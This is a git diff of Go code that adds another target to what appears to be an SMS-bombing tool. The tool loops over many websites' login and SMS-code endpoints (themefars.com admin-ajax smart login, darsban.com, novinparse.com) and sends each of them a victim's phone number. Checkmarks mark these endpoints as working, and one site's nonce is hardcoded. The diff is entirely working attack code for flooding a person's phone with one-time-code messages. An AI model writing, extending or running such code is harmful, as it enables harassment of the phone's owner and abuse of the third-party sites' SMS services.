@@ -481,7 +481,21 @@ cookieJar, _ := cookiejar.New(nil)
 	}
 
 	for i := 0; i < repeatCount; i++ {
-		
+	//new:
+
+
+               // themefars.com ✅  	
+               wg.Add(1)
+               tasks <- func(c *http.Client) func() {
+                        return func() {
+               formData := url.Values{}
+               formData.Set("action", "mwpl_smart_login_form_check_username")
+               formData.Set("nonce", "dd172d0303") 
+               formData.Set("smart_login_username", phone)
+               formData.Set("password", "dynamic_code") 
+               sendFormRequest(c, ctx, "https://themefars.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+                    }
+                    }(client)
                // darsban.com (JSON) ✅ 
                wg.Add(1)
                tasks <- func(c *http.Client) func() {
@@ -493,7 +507,7 @@ cookieJar, _ := cookiejar.New(nil)
                 sendJSONRequest(c, ctx, "https://www.darsban.com/api/usersmslogin", payload, &wg, ch)
                 }
         }(client)
-
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		// novinparse.com (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
